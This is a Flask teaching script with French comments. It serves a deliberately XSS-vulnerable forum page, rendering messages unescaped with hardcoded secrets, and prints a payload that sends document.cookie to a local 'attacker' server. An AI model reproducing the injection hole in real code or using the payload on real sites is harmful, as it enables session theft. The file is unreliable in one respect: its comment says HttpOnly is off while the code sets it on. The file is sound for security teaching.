# /// script
# dependencies = [
#   "flask",
# ]
# ///

from flask import Flask, make_response, render_template_string, request

app = Flask(__name__)
app.secret_key = "super_secret_key_123"

# Template HTML vulnérable - Le message est injecté sans escaping !
VULNERABLE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Forum de discussion</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .message { background: #f0f0f0; padding: 15px; margin: 10px 0; border-radius: 5px; }
        form { margin: 20px 0; }
        input[type="text"] { width: 300px; padding: 10px; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Forum de discussion</h1>

    <h2>Bienvenue, {{ username }}!</h2>
    <p>Votre session ID: <code>{{ session_id }}</code></p>

    <h3>Poster un message</h3>
    <form method="GET" action="/post">
        <input type="text" name="message" placeholder="Votre message...">
        <button type="submit">Envoyer</button>
    </form>

    {% if message %}
    <h3>Dernier message:</h3>
    <div class="message">
        <!-- VULNÉRABILITÉ ICI: Le message est inséré sans échappement! -->
        {{ message | safe }}
    </div>
    {% endif %}

    <hr>
    <p><small>⚠️ Cette application est vulnérable au XSS à des fins éducatives.</small></p>
</body>
</html>
"""


@app.route("/")
def index():
    # Créer un cookie de session simulé
    resp = make_response(
        render_template_string(
            VULNERABLE_TEMPLATE,
            username="Alice",
            session_id="abc123secret",
            message=None,
        )
    )
    # Cookie de session (sans HttpOnly pour démontrer la vulnérabilité)
    resp.set_cookie("session_id", "abc123secret", httponly=True)
    resp.set_cookie("user", "Alice", httponly=True)
    return resp


@app.route("/post")
def post_message():
    # VULNÉRABILITÉ: Le message de l'utilisateur est affiché sans échappement
    message = request.args.get("message", "")

    return render_template_string(
        VULNERABLE_TEMPLATE,
        username="Alice",
        session_id="abc123secret",
        message=message,  # Pas d'échappement! XSS possible!
    )


if __name__ == "__main__":
    print("=" * 60)
    print("APPLICATION VULNÉRABLE AU XSS - ÉDUCATION UNIQUEMENT!")
    print("=" * 60)
    print("\n1. Ouvrez http://localhost:5000 dans votre navigateur")
    print("\n2. Essayez ce payload XSS dans le champ message:")
    print(
        '   <script>new Image().src="http://localhost:5001/steal?cookie="+document.cookie</script>'
    )
    print(
        "\n3. Lancez le serveur attaquant (attacker_server.py) pour voir les cookies volés"
    )
    print("=" * 60)
    print("\n\n")
    app.run(port=5000)
